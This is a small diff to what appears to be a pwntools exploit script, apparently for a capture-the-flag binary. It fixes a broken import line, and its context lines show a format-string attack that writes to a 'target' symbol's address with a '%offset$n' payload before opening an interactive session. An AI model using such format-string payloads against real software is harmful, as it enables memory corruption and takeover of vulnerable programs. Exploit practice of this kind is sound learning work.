@@ -1,5 +1,4 @@
-from pwn 
-import *
+from pwn import *
 
 context.log_level = 'error'
 
@@ -28,6 +27,7 @@ if args.TARGET:
     # so: f'{p32(e.symbols["target"])}%{offset}$n'.encode() => b'b"\x78\x56\x34\x12"%22$n'
     # which doesn't work because of the additional b"" lol
     p.sendline(p32(e.symbols["target"]) + f'%{offset}$n'.encode())
+
 
     p.interactive()
     p.close()
